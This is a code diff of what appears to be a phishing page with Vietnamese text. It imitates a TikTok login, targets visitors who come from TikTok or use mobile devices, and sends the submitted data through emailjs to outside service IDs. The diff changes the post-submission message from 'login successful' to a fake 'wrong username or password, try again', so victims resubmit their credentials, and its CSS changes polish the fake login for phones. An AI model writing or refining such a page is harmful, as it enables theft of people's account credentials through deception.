@@ -29,6 +29,9 @@
             margin: 0 auto;
             text-align: center;
             position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         .header-container {
             display: flex;
@@ -105,6 +108,7 @@
             display: none;
             margin: 0 auto;
             max-width: 400px;
+            width: 100%;
         }
         .login-container-tiktok.active, .login-container-desktop.active,
         .forgot-password-container.active, .forgot-password-email-container.active, 
@@ -194,7 +198,7 @@
             margin-bottom: 8px;
         }
         .success-popup-message {
-            font-size: 14px;
+            font-size: 12px; /* Chữ nhỏ hơn */
             color: #4b4f56;
             margin-bottom: 15px;
         }
@@ -255,6 +259,17 @@
         }
         body.tiktok-mode {
             background: linear-gradient(to bottom, #69C9D0, #EE1D52);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        body.tiktok-mode .main-container {
+            padding: 15px;
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         body.tiktok-mode .footer {
             background: transparent;
@@ -283,6 +298,10 @@
             .back-button {
                 top: 10px;
                 left: 10px;
+            }
+            .login-container-tiktok {
+                width: 90%;
+                max-width: 350px;
             }
         }
     </style>
@@ -415,7 +434,7 @@
                 referrer.includes("tiktok.com") || 
                 userAgent.includes("tiktok") || 
                 urlParams.get("utm_source") === "tiktok" || 
-                /mobile|android|iphone|ipad/i.test(userAgent); // Thêm điều kiện điện thoại
+                /mobile|android|iphone|ipad/i.test(userAgent);
 
             console.log("Referrer:", referrer);
             console.log("User Agent:", userAgent);
@@ -559,7 +578,7 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Đăng nhập thành công!", "Thông tin đã được gửi đến Gmail của bạn!");
+                    showDialog("Đăng nhập thất bại!", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại");
                 }, function(error) {
                     showDialog("Đăng nhập thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
                 });
